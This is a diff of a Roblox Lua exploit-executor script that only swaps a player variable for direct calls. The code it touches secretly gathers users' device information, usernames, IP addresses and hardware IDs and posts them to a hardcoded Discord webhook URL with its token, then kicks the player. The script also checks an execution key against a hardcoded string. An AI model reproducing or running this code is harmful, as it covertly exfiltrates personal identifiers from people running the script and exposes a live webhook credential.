@@ -1,10 +1,8 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
 
-local MainPlayer = game:GetService("Players").LocalPlayer
-
 getgenv().secretfunc = function(func)
 	if func == nil then
-		MainPlayer:Kick("not available right now!")
+		game.Players.LocalPlayer:Kick("not available right now!")
 		error("kaka!")
 	else
 		local result = func()
@@ -12,7 +10,7 @@ getgenv().secretfunc = function(func)
 		if result == "cyUSkT6AgP" then
 			
 		else
-			MainPlayer:Kick("Lil bro ur api version is outdated go and update it")
+			game.Players.LocalPlayer:Kick("Lil bro ur api version is outdated go and update it")
 			error("Outdated Error")
 		end
 	end
@@ -364,7 +362,7 @@ task.spawn(function()
         return result
     end
 
-    local message = "Device -> "..kaka().."\nUser -> "..MainPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId
+    local message = "Device -> "..kaka().."\nUser -> "..game.Players.LocalPlayer.Name.."\nJobId -> "..game.JobId.."\nPlaceId -> "..game.PlaceId.."\nGameId -> "..game.GameId
     local options = {
         Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
         Body = HttpService:JSONEncode({
@@ -383,7 +381,7 @@ task.spawn(function()
     while true do
         wait(5)
         if identifyexecutor() ~= "PSWalloz" or getexecutorname() ~= "PSWalloz" then
-            local kakav3 = "<@1096243430146977832> \nidentifyexecutor -> "..identifyexecutor().."\ngetexecutorname -> "..getexecutorname().."\nIp -> "..disocrdip().."\nHwid -> "..gethwid().."\nUsername -> "..MainPlayer.Name
+            local kakav3 = "<@1096243430146977832> \nidentifyexecutor -> "..identifyexecutor().."\ngetexecutorname -> "..getexecutorname().."\nIp -> "..disocrdip().."\nHwid -> "..gethwid().."\nUsername -> "..game.Players.LocalPlayer.Name
                 Url = "https://discord.com/api/webhooks/1347691014395269130/HY5klKqvCvglZagfYbqrZFSxV2S8slKG6fVn5FRWQdod0DyQLDdpLVO-GKB53M0MSiy6",
                 Body = HttpService:JSONEncode({
                     ['content'] = tostring(kakav3),
@@ -395,7 +393,7 @@ task.spawn(function()
                 }
             }
             sendRequest(kaka, timeout)
-            MainPlayer:Kick("stop skidding lil bro")
+            game.Players.LocalPlayer:Kick("stop skidding lil bro")
             error("skidder alert")
         end
     end
